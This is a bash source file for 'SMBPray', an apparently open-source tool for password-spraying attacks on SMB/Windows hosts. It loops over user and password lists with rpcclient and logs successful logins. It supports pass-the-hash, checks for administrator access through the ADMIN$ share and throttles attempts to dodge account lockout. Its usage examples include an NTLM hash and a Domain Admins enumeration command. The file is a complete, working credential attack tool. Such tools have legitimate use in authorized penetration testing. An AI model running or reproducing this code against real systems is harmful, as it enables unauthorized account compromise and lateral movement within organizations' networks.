#!/usr/bin/env bash
#
#    Copyright (C) 2018 Alexandre Teyar
#
# Licensed under the Apache License, SCRIPT_VERSION 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
#    limitations under the License.

# TODO:
# Package as a .deb?
# Make the script bashate compliant / Add OS check before relying on dpkg to check for dependancies
# Add support for IP ranges
# Finish to write the usage and beautify the english
# Mutual exclusive options
# add option for an authentication file username password - for testing the domain once accounts are compromised

# enable stricter programming rules (turns some bugs into errors)
# set -Eeuo pipefail

declare -r  PROGNAME=$(basename $0)
declare -r  PROGBASENAME=${PROGNAME%%.*}
declare -r  PROGVERSION='0.1'

declare -ar REQUIRED_PACKAGES=('coreutils' 'smbclient') # if experiencing any issue at all with the dependancies, comment this out
declare -a  RPCCLIENT_OPTIONS=('--signing=on')
declare -r  DATE_FORMAT='+%d/%m/%Y-%H:%M:%S'

declare -r  CREDS_SEPARATOR=':'
declare -i  CFLAG=0

declare -a  DOMAINS
declare -a  HOSTS
declare -i  LOCKOUT_DURATION=1800 # 30 mins
declare -i  LOCKOUT_TRESHOLD=3
declare     OUT_FOLDER=$PROGBASENAME
declare -a  PASSWORDS
declare -a  USERS
declare -i  VERBOSE=0

trap quit INT

function quit() { 
    print "Trapped CTRL-C"
    exit 0
}

function print()         { printf "%s » %s\n" "${PROGBASENAME}" "${@}"; }

function print_attempt() { printf "%s » %-48.48s %-48.48s %s\n" "${PROGBASENAME}" "$1" "$2" "$3"; }

function print_date()    { printf "%s > %s » %s\n" "${PROGBASENAME}" "$(date "$DATE_FORMAT")" "${@}"; }

function print_error()   { printf "%s > error » %s\n" "${PROGBASENAME}" "${@}"; }

function print_lockout() { 
    printf "%s > %s » The password spraying attack has \
been paused for %s minutes to prevent accounts from \
being locked out...\n" "${PROGBASENAME}" "$(date "$DATE_FORMAT")" "$(($LOCKOUT_DURATION / 60))"
}

function write_locked_log()  {
    if ! [ -f "${OUT_FOLDER}/locked.log" ]
    then
        mkdir -p "${OUT_FOLDER}/" && touch "${OUT_FOLDER}/locked.log"
    fi

    printf "%s %s\n" "$(date "$DATE_FORMAT")" "${@}" >> "${OUT_FOLDER}/locked.log"
}

function write_results_log() { 
    if ! [ -f "${OUT_FOLDER}/$2" ]
    then
        mkdir -p "${OUT_FOLDER}/" && touch "${OUT_FOLDER}/$2"
    fi

    printf "%s %s\n" "$(date "$DATE_FORMAT")" "$1" >> "${OUT_FOLDER}/${2}.log"
}

# Maybe improve with the new getopt
# exclude options e.g. -la cant be used with -d
# -lt and -ld dont work with --creds
function parse_args() {
    local -i dflag=0
    local -i hflag=0
    local -i pflag=0
    local -i uflag=0
    local -i var=0

    while (($# > 0))
    do
        OPT=$1

        case $OPT in
            --help)
                usage
                exit 0
                ;;  
            -v)
                VERBOSE=1
                ;;            
            -vv)
                VERBOSE=2
                ;;
            -V|--version)
                banner
                exit 0
                ;;
            --creds)
                pflag=1
                uflag=1
                CFLAG=1
                OPTARG=$(realpath $2)

                if [[ -f $OPTARG ]]
                then
                    utemp=$(mktemp XXXXXXXXXXXXXXXX)
                    ptemp=$(mktemp XXXXXXXXXXXXXXXX)
                    awk -F "$CREDS_SEPARATOR" '{ print $1 }' $OPTARG > $utemp
                    awk -F "$CREDS_SEPARATOR" '{ print $2 }' $OPTARG > $ptemp
                    load_array $utemp USERS
                    load_array $ptemp PASSWORDS
                    rm -f $utemp $ptemp
                else
                    print_error "$OPTARG is not a valid file"
                    exit 1
                fi
                ;;
            -d)
                dflag=1
                OPTARG=$2
                DOMAINS=($OPTARG)
                ;;
            -D)
                dflag=1
                OPTARG=$2
                load_array $OPTARG DOMAINS
                ;;
            -h)
                hflag=1
                OPTARG=$2
                HOSTS=($OPTARG)
                ;;
            -H)
                hflag=1
                OPTARG=$2
                load_array $OPTARG HOSTS
                ;;
            -la) # local authentication
                dflag=1
                DOMAINS=('WORKGROUP')
                ;;
            -ld)
                OPTARG=$2
                LOCKOUT_DURATION=$OPTARG
                ;;
            -lt) 
                OPTARG=$2
                LOCKOUT_TRESHOLD=$OPTARG
                ;;
            -o)
                OPTARG=$2
                OUT_FOLDER=$OPTARG
                ;;
            --pth)
                RPCCLIENT_OPTIONS+=('--pw-nt-hash')
                ;;
            -p)
                pflag=1
                OPTARG=$2
                PASSWORDS=($OPTARG)
                ;;
            -P)
                pflag=1
                OPTARG=$2
                load_array $OPTARG PASSWORDS
                ;;        
            -u)
                uflag=1
                OPTARG=$2
                USERS=($OPTARG)
                ;;
            -U)
                uflag=1
                OPTARG=$2
                load_array $OPTARG USERS
                ;;       
            -*)
                printf "%s: illegal option -- %s\n" "$PROGNAME" "$OPT"
                exit 1
                ;;
        esac
        
        shift      
    done

    if [[ $dflag = 0 ]]
    then
        var=1
        printf "${PROGNAME}: missing mandatory option -- d|D|la\n"
    fi

    if [[ $hflag = 0 ]]
    then
        var=1
        printf "${PROGNAME}: missing mandatory option -- h|H\n"
    fi

    if [[ $pflag = 0 ]]
    then
        var=1
        printf "${PROGNAME}: missing mandatory option -- p|P|creds\n"
    fi

    if [[ $uflag = 0 ]]
    then
        var=1
        printf "${PROGNAME}: missing mandatory option -- u|U|creds\n"
    fi

    if [[ $var = 1 ]]
    then
        exit 1
    fi
}

# add the lockout threshold/duration and local authentication options
# maybe add -t and rename all the HOST to target and add -h for help
function usage() {
cat <<- USAGE

Usage: $PROGNAME [OPTIONS]

Perform password spraying attacks. Spray and pray!

Mandatory arguments:
    -d              domain name
    -D              file containing the domain name(s) (one entry per line) or folder containing the files containing the domain name(s)
    -h              host
    -H              file containing the host(s) (one entry per line) or folder containing the files containing the host(s)
    -p              password
    -P              file containing the password(s) (one entry per line) or folder containing the files containing the password(s)
    -u              user
    -U              file containing the user(s) (one entry per line) or folder containing the files containing the user(s)

Optional arguments:
    -o              directory where the log files will be written to
    -v              output each attempts (default: only success and lockouts), print the script parameters detail
    -V, --version   show the banner/version

Examples:
    bash $PROGNAME -u jsmith -p password1 -d workgroup -H 192.168.0.1
    bash $PROGNAME -u jsmith -p 'aad3b435b51404eeaad3b435b51404ee:da76f2c4c96028b7a6111aef4a50a94d' -H 172.16.0.20
    bash $PROGNAME -u 'apadmin' -p 'asdf1234!' -d ACME -h 10.1.3.30 -x 'net group "Domain Admins" /domain'
USAGE
}

function banner() {
cat <<- BANNER
SMBPray v${PROGVERSION}
Author: Alexandre Teyar | LinkedIn: linkedin.com/in/alexandre-teyar | GitHub: github.com/AresS31

BANNER

    if [[ $VERBOSE = 2 ]]
    then
        echo "$(declare -p)"$'\n'
    fi

}

function check_requirements() {
    local -i var=0
    
    print 'Bash version check...'
    if ((BASH_VERSINFO[0] < 4))
    then 
        var=1
        print_error "A minimum of bash version 4.0 is required. Upgrade your version with: sudo apt-get install --only-upgrade bash"
    else
        print 'The bash minimum version requirement is satify'
    fi

    print 'Dependencies check...'
    for package in ${REQUIRED_PACKAGES[@]}
    do
        if [[ -n $(dpkg -s $package 2> /dev/null) ]]
        then
            continue
        else
            var=1
            print_error "The $package package is missing. Install it with: sudo apt-get install $package -y"
        fi
    done

    if [[ $var = 1 ]]
    then
        exit 1
    fi

    print 'All of the required packages are already installed'
}

function load_array() {
    local -n array=$2
    local -a var

    if [[ -d $(realpath $1) ]]
    then
        for i in $(realpath $1)/*
        do
            readarray -t var < $(realpath "$i")
            array+=(${var[@]})
            unset var
        done
    elif [[ -f $(realpath $1) ]]
    then
        readarray -t array < $(realpath $1)
    else
        print_error "$1 is not a valid directory or file"
        exit 1
    fi
}

function spray() {
    local -i counter=0
    local -i isAdmin=0
    local    output
    local    password
    local    username
    local    var
    local    var1
    local    var2
    local -i sflag=0 # enable verbose for successful and lockout attempts even when the verbose switch is disabled
    local -a _PASSWORDS
    local -a _USERS  # create a local copy of USERS

    _PASSWORDS=(${PASSWORDS[@]}) # reindex the array to remove empty entries

    for domain in ${DOMAINS[@]}
    do
        for host in ${HOSTS[@]}
        do
            _USERS=(${USERS[@]}) # reindex the array to remove empty entries and entries removed in previous iterations

            for ((i=0; i <= ((${#_PASSWORDS[@]} - 1)); i++))
            do 
                password=${_PASSWORDS[i]}
                ((counter++))

                for ((j=0; j <= ((${#_USERS[@]} - 1)); j++))
                do 
                    if [[ $CFLAG = 1 ]]
                    then
                        j=$i
                    fi

                    user=${_USERS[j]}
                    isAdmin=0
                    var="${host}:139:"
                    var1="${domain}\\${user}:${password}"

                    res=$(rpcclient "${RPCCLIENT_OPTIONS[@]}" --workgroup="$domain" -U "${user}%${password}" -c 'getusername' "$host")

                    if [[ $res =~ 'Cannot connect to server.' ]]
                    then
                        ERROR=$(echo $res | awk '{print $NF}')
                        var2=" -> LOGON FAILED (${ERROR})"

                        if [[ $ERROR = 'NT_STATUS_ACCOUNT_LOCKED_OUT' ]]
                        then
                            write_locked_log "${domain}\\${user}"
                            sflag=1
                        fi
                    else
                        var2=' -> LOGON SUCCESS '

                        res=$(rpcclient "${RPCCLIENT_OPTIONS[@]}" --workgroup="$domain" -U "${user}%${password}" -c 'netsharegetinfo ADMIN$' "$host")

                        if [[ $res =~ 'netname' ]]
                        then
                            var2+='(Pwn3d!)'
                            isAdmin=1
                        fi

                        write_results_log "${domain}\\${user}:${password} $isAdmin" "$host"

                        # delete user entry and reindex the user list
                        if [[ $CFLAG = 0 ]]
                        then
                            unset _USERS[j]
                            _USERS=(${_USERS[@]})
                        fi

                        sflag=1
                    fi

                    if [[ $VERBOSE > 0 || $sflag = 1 ]]
                    then
                        print_attempt "$var" "$var1" "$var2"
                        sflag=0
                    fi

                    if [[ $CFLAG = 1 ]]
                    then
                        break
                    fi
                done

                if ! [[ ${_USERS[@]} ]] # 100% success rate case
                then
                    print "All the suppplied accounts' password have been uncovered on $domain\\$host"
                    break
                fi

                # avoid account lockout
                if [[ $CFLAG = 0 ]] && ! (( $counter % $LOCKOUT_TRESHOLD ))
                then
                    print_lockout
                    sleep $LOCKOUT_DURATION
                fi
            done
        done
    done
}

function main() {
    STARTTIME=$(date '+%s')
    print_date "Starting password spraying attack..."

    spray

    ENDTIME=$(date '+%s')
    ELAPSED=$(($ENDTIME - $STARTTIME))
    print_date "It took $(($ELAPSED / 60)) minutes to completed"
}

parse_args $@
banner
check_requirements
main
